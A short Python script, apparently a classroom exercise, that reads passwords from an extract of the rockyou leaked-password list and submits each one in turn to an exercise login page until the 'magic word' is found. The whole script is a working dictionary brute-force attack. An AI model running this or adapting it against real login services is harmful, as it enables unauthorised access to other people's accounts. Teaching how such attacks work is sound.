import csv
import requests



def requette(mdp):
    global p, d
    d = requests.get("http://monsieur.k2000.free.fr/exercice/acces.php?mot_de_passe=" + str(mdp), verify = False)
    print(d)
    p = d.text
    



mot_de_passe = []

def lecture_csv(c):
    with open(c, newline='',encoding='utf-8-sig') as csvfile:
        fichier = csv.DictReader(csvfile, delimiter=',')
        for ligne in fichier :
            mot_de_passe.append(dict(ligne))
        print('////')
        print('////')
        print(mot_de_passe)
        return mot_de_passe
    
lecture_csv('extraitrockyou.csv')
print(mot_de_passe)
for i in range(len(mot_de_passe)):
    requette(mot_de_passe[i]['motdepasse'])
    print(mot_de_passe[i]['motdepasse'])
    if 'Ah ah ah vous n\'avez pas trouvÃ© le mot magique' in p:
        print('pas trouvé')
    else:
        print('trouvé')
        print(mot_de_passe[i]['motdepasse'])
        break



